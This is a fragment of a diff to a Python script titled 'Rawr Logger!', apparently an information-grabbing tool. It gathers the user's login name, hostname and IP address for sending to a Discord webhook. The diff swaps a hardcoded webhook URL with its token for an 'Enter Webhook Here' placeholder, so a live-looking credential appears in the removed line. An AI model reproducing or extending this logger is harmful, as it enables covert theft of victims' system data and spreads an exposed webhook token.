@@ -11,7 +11,7 @@ import shutil
 os.system(f'cls & title Rawr Logger!')
 
 u = os.getlogin()
-webhook = "https://discordapp.com/api/webhooks/1018194678853685309/LZSsAnCsltCFGzQgdpQ5pSJ4LyMwPRj74WTGAFFChOe7WGGPCmOaulFolU1U_jQF7fI2"
+webhook = "Enter Webhook Here"
 hostname = socket.gethostname()   
 pc_username = os.getenv("UserName")
 ip = socket.gethostbyname(hostname)  
